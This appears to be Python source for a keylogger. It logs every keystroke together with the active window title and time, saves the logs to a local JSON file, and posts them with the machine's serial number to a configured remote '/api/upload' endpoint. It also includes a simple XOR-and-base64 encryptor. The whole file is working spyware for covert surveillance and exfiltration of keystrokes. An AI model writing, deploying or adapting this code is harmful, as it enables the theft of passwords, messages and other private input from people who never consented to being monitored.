import requests,time,pygetwindow,json,os,base64,yaml
import utils
from Interface import IKeyLogger,IWrite

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)

URL = config['general']['base_url']


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.__logged_keys = {}
        self.__last_record = ""
        self.__last_type_time = None
        self.__last_window = None

    def on_press(self, key:str) -> None:
        key = utils.format_key(key)
        if key == "":
            return
        current_time = time.time()
        current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
        active_window = pygetwindow.getActiveWindowTitle()

        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
            self.__last_record = (active_window if isinstance(active_window,str) else 'General window') + ': ' + current_time_formatted

        self.__last_type_time = current_time
        self.__last_window = active_window
        if self.__last_record not in self.__logged_keys:
            self.__logged_keys[self.__last_record] = ""
        self.__logged_keys[self.__last_record] += key

    def get_logged_keys(self) -> dict[str:str]:
        temp_log = self.__logged_keys
        self.__logged_keys = {}
        return temp_log

class FileWriter(IWrite):
    def __init__(self):
        self.path = utils.get_file_path()

    def write(self, sn, data: dict[str:str]) -> bool:
        try:
            if os.path.exists(self.path) and os.path.getsize(self.path) > 0:
                with open(self.path, 'r', encoding='utf-8') as file:
                    try:
                        data_dict = json.load(file)
                    except json.JSONDecodeError:
                        data_dict = {}
            else:
                data_dict = {}
            for key, val in data.items():
                data_dict[key] = data_dict.get(key, "") + val
            with open(self.path, "w", encoding='utf-8') as file:
                json.dump(data_dict, file, ensure_ascii=False, indent=4)

            return True

        except (IOError, json.JSONDecodeError):
            return False

class NetworkWriter(IWrite):
    def __init__(self):
        self.url =  URL
    def write(self, serial_number, data:dict[str:str]) -> bool:
        if not data:
            return True
        try:
            all_data = {"machine":str(serial_number),"data":data}
            response = requests.post(self.url+'/api/upload', json=all_data)
            return response.status_code == 200
        except requests.exceptions.RequestException:
            return False


class Encryptor:
    def __init__(self,key):
        self.key = key

    def encrypt(self, data: str) -> str:
        data_bytes = data.encode('utf-8')
        ciphertext = bytearray()
        length_key = len(self.key)

        for index in range(len(data_bytes)):
            xor_byte = (data_bytes[index] ^ ord(self.key[index % length_key])) & 0xFF
            ciphertext.append(xor_byte)

        return base64.b64encode(ciphertext).decode('utf-8')